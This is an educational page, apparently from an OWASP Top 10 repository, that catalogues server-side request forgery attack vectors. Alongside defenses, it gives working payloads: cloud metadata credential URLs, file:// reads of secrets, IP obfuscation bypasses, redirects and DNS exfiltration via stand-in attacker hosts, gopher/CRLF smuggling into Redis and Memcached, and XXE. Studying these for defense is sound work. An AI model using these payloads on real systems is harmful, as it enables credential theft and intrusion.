# SSRF — Attack Vectors

## Table of Contents

- [The Core Attack Flow](#the-core-attack-flow)
- [1. Basic URL-Parameter SSRF](#1-basic-url-parameter-ssrf)
- [2. Cloud Metadata Endpoint Access](#2-cloud-metadata-endpoint-access)
- [3. Loopback and Internal-Host Access](#3-loopback-and-internal-host-access)
- [4. Internal Port Scanning](#4-internal-port-scanning)
- [5. Local File Read via file://](#5-local-file-read-via-file)
- [6. IP-Address Obfuscation Bypasses](#6-ip-address-obfuscation-bypasses)
- [7. DNS Rebinding (TOCTOU)](#7-dns-rebinding-toctou)
- [8. Redirect-Chain Bypasses](#8-redirect-chain-bypasses)
- [9. Blind / Out-of-Band SSRF](#9-blind--out-of-band-ssrf)
- [10. Protocol Smuggling with gopher:// and CRLF](#10-protocol-smuggling-with-gopher-and-crlf)
- [11. SSRF via File Parsers (XXE, SVG)](#11-ssrf-via-file-parsers-xxe-and-svg)
- [12. Webhook and Callback Abuse](#12-webhook-and-callback-abuse)
- [13. Allowlist and Parser-Confusion Bypasses](#13-allowlist-and-parser-confusion-bypasses)
- [Attacker Methodology Summary](#attacker-methodology-summary)

## The Core Attack Flow

Almost every SSRF exploit follows the same four steps. Understanding this flow makes the individual vectors below feel like variations on one theme.

```
1. FIND      Locate a feature that fetches something on the server:
             ?url= , image URLs, webhooks, import-from-URL, PDF/preview generators.

2. CONFIRM   Point it at a server you control and watch for the callback
             (HTTP hit or DNS lookup) -> proves the server makes the request.

3. REDIRECT  Aim the request at an internal target:
             cloud metadata, localhost services, private-range hosts, file://.

4. EXPLOIT   Extract value: steal credentials, read files, scan ports,
             smuggle a protocol, or pivot deeper into the network.
```

> **Reflected vs. blind**: if step 4's response is shown back to you, exploitation is direct. If it is not, you fall back to timing, status-code, and out-of-band signals (see vector 9). Both are dangerous.

## 1. Basic URL-Parameter SSRF

The simplest and most common form: a parameter names a URL the server retrieves. The attacker replaces the intended value with an internal target.

```
# Intended request the app makes on the user's behalf:
GET /preview?url=https://example.com/article HTTP/1.1

# Attacker substitutes an internal destination:
GET /preview?url=http://localhost/admin HTTP/1.1
GET /preview?url=http://10.0.0.5:8080/ HTTP/1.1
GET /fetch?target=http://192.168.1.1/ HTTP/1.1
```

Common parameter names to look for: `url`, `uri`, `target`, `dest`, `redirect`, `image`, `img`, `src`, `source`, `callback`, `webhook`, `feed`, `proxy`, `fetch`, `load`, `host`, `domain`, `page`.

## 2. Cloud Metadata Endpoint Access

The highest-value target in cloud environments. The link-local metadata service answers any local caller and, on IMDSv1, returns temporary role credentials.

```
# Enumerate the instance role, then read its credentials (IMDSv1 style):
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role

# Other providers expose analogous metadata paths on the same 169.254.169.254 address;
# some require a header such as "Metadata-Flavor: Google" or "Metadata: true".
```

**IMDSv2 note**: where IMDSv2 is enforced, a plain GET fails because the endpoint demands a session token obtained via a prior `PUT`. A GET-only SSRF cannot perform that handshake, and header-injecting the token is usually impossible through a simple `?url=` sink. This is exactly why enforcing IMDSv2 (and disabling v1) blunts this vector.

## 3. Loopback and Internal-Host Access

Services bound to `127.0.0.1` or private ranges assume only local, trusted callers can reach them. SSRF makes the app that caller.

```
# Admin panels and dashboards bound to loopback:
?url=http://127.0.0.1:8080/admin
?url=http://localhost:9200/_cat/indices        # Elasticsearch
?url=http://127.0.0.1:8500/v1/kv/?recurse       # Consul KV
?url=http://127.0.0.1:2375/containers/json      # Docker API
?url=http://127.0.0.1:15672/api/overview        # RabbitMQ management
```

## 4. Internal Port Scanning

By varying the host and port and observing how the app responds, an attacker maps the internal network even without reading response bodies.

```
# Sweep ports on an internal host and infer state from behaviour:
?url=http://10.0.0.5:22
?url=http://10.0.0.5:80
?url=http://10.0.0.5:6379
?url=http://10.0.0.5:9200

# Inference signals:
#   fast connection refused     -> port closed
#   slow timeout                -> filtered / no host
#   immediate 200 / error body  -> port open, service present
#   distinctive error text      -> service fingerprint
```

## 5. Local File Read via file://

If the fetching library honors the `file://` scheme, SSRF becomes arbitrary local file disclosure.

```
?url=file:///etc/passwd
?url=file:///etc/hostname
?url=file:///proc/self/environ          # process environment (may contain secrets)
?url=file:///var/www/app/config/settings.py
?url=file:///c:/windows/win.ini         # Windows
```

Related schemes to test when `http` is filtered: `dict://`, `ftp://`, `ldap://`, `tftp://`, and `gopher://` (see vector 10). Each is a reason to disable schemes you do not explicitly need.

## 6. IP-Address Obfuscation Bypasses

String blocklists that look for `127.0.0.1` or `169.254.169.254` fail against the many equivalent encodings of the same address.

```
# All of these resolve to 127.0.0.1:
http://127.0.0.1
http://127.1                 # short form
http://0.0.0.0
http://0177.0.0.1            # octal
http://0x7f000001            # hex (whole address)
http://2130706433            # decimal (whole address)
http://[::1]                 # IPv6 loopback
http://[::ffff:127.0.0.1]    # IPv4-mapped IPv6

# 169.254.169.254 obfuscated:
http://2852039166            # decimal
http://0xa9fea9fe            # hex
http://169.254.169.254.nip.io  # DNS name that resolves to the metadata IP

# Also: userinfo trick to fool naive host parsing
http://expected-host.com@169.254.169.254/
http://169.254.169.254#@expected-host.com/
```

The durable defense is not to enumerate these — it is to **resolve the host and check the resulting IP** against reserved ranges (covered in Prevention).

## 7. DNS Rebinding (TOCTOU)

Even an app that resolves the hostname and validates the IP can be beaten if it resolves twice: once to validate, once to connect. An attacker controls a domain whose DNS answer changes between the two lookups.

```
# Attacker's domain with a very short TTL:
attacker.example.  A  203.0.113.10   # public IP -> passes validation
# ...moments later, same name resolves to:
attacker.example.  A  169.254.169.254 # internal IP -> used for the actual fetch

# Flow:
#  1. App resolves attacker.example -> 203.0.113.10, validates as "public", OK.
#  2. App's HTTP client resolves attacker.example AGAIN -> 169.254.169.254.
#  3. Connection goes to the metadata endpoint. Validation bypassed.
```

Defense: resolve once, pin that exact IP, validate it, and connect to the pinned IP (not the name) — so the check and the use reference the same address.

## 8. Redirect-Chain Bypasses

If the URL passes validation but the HTTP client follows redirects, the destination controls where the request ultimately lands.

```
# Attacker hosts a "clean" URL that 302-redirects to an internal target:
?url=https://attacker.example/go

# attacker.example/go responds:
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/

# The validated URL was public; the followed redirect was not.
# Variations chain multiple hops or use protocol-relative // and relative Location.
```

Defense: do not follow redirects, or intercept and re-validate every hop's resolved IP before continuing.

## 9. Blind / Out-of-Band SSRF

When nothing is reflected, the attacker proves and drives the request through an external listener (an "interaction server") and through timing.

```
# 1. Confirm the request fires at all:
?url=http://a1b2c3.attacker-collab.example/     # watch for the inbound HTTP/DNS hit

# 2. DNS-only exfiltration when outbound HTTP is blocked but DNS is not:
?url=http://SECRET-DATA.attacker-collab.example/

# 3. Boolean/timing oracle to probe internal hosts blindly:
?url=http://10.0.0.5:6379   # long hang  = filtered
?url=http://10.0.0.5:80     # quick reply = open
```

Blind SSRF is fully sufficient for reconnaissance and, combined with vector 10, for one-way exploitation.

## 10. Protocol Smuggling with gopher:// and CRLF

`gopher://` lets an attacker send arbitrary bytes over a TCP connection, which means speaking the wire protocol of an internal service directly. CRLF injection into a URL can achieve a similar effect against line-based protocols.

```
# Conceptual gopher payload that writes commands to an internal Redis (port 6379).
# Newlines are URL-encoded as %0d%0a so the raw bytes form valid Redis commands:
gopher://127.0.0.1:6379/_SET%20k%20%22payload%22%0d%0aSAVE%0d%0a

# CRLF injected into a fetched URL to inject extra protocol lines:
?url=http://127.0.0.1:11211/%0d%0aset%20key%200%200%205%0d%0ahello%0d%0a   # Memcached
```

This is how a "read-only" blind SSRF becomes remote code execution: unauthenticated services like Redis, Memcached, and some SMTP setups act on whatever bytes arrive.

## 11. SSRF via File Parsers (XXE and SVG)

SSRF does not require a visible `url=` parameter. Any server-side parser that resolves external references is a sink.

```xml
<!-- XML External Entity that triggers a server-side fetch (XXE -> SSRF) -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&x;</data>

<!-- SVG that references a remote/internal image; server-side rasterizers fetch it -->
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://127.0.0.1:8080/admin" />
</svg>
```

Uploaded documents, SVG avatars, HTML-to-PDF conversion, and feed importers are all common carriers for this class.

## 12. Webhook and Callback Abuse

Features that deliver to a user-supplied callback are SSRF by design; the attacker simply supplies an internal callback.

```
POST /api/integrations/webhooks HTTP/1.1
Content-Type: application/json

{ "event": "order.created",
  "callback_url": "http://169.254.169.254/latest/meta-data/" }

# Or abuse a "Test webhook" button that immediately fetches the URL:
POST /api/webhooks/test  { "url": "http://127.0.0.1:8500/v1/kv/?recurse" }
```

These need explicit egress controls (block internal ranges after resolution) because you cannot allowlist arbitrary customer destinations.

## 13. Allowlist and Parser-Confusion Bypasses

When a naive allowlist checks only that the URL "contains" or "starts with" an expected value, attackers exploit differences between the validator's URL parsing and the HTTP client's.

```
# "Contains expected.com" checks fail against:
http://expected.com.attacker.example/          # expected.com is a subdomain label
http://attacker.example/expected.com           # expected.com is in the path
http://expected.com@attacker.example/          # expected.com is userinfo, host is attacker
http://attacker.example\@expected.com/         # backslash confuses some parsers

# Case, trailing dot, and encoding tricks:
http://EXPECTED.com/  http://expected.com./  http://expected%2ecom/
```

Defense: parse the URL properly, compare the **exact host** against an allowlist, and validate the resolved IP — never use substring matching.

## Attacker Methodology Summary

| Phase | Attacker Action | Signal / Payoff |
|-------|-----------------|-----------------|
| Discovery | Find URL/file/webhook sinks in parameters, uploads, headers | Candidate SSRF surface |
| Confirmation | Point at an interaction server (HTTP/DNS callback) | Proof the server fetches |
| Bypass | Obfuscate IPs, rebind DNS, chain redirects, confuse parsers | Defeat naive filters |
| Recon | Scan internal ports and hosts via timing/errors | Network map |
| Extraction | Read metadata credentials, local files, service data | Secrets, data |
| Escalation | Smuggle protocols (gopher/CRLF) to internal services | Code execution, pivot |

## Next Steps

- **[Overview](./overview.md)**: What SSRF is and why it matters.
- **[Prevention](./prevention.md)**: The layered defenses that stop every vector above.
- **[Examples](./examples.md)**: Vulnerable vs. secure code across four languages.
- **[Lab](./lab/ssrf-simulation-lab/)**: Try these vectors safely in an isolated simulation.

---

*Part of the [OWASP Top 10 Educational Repository](../../README.md)*
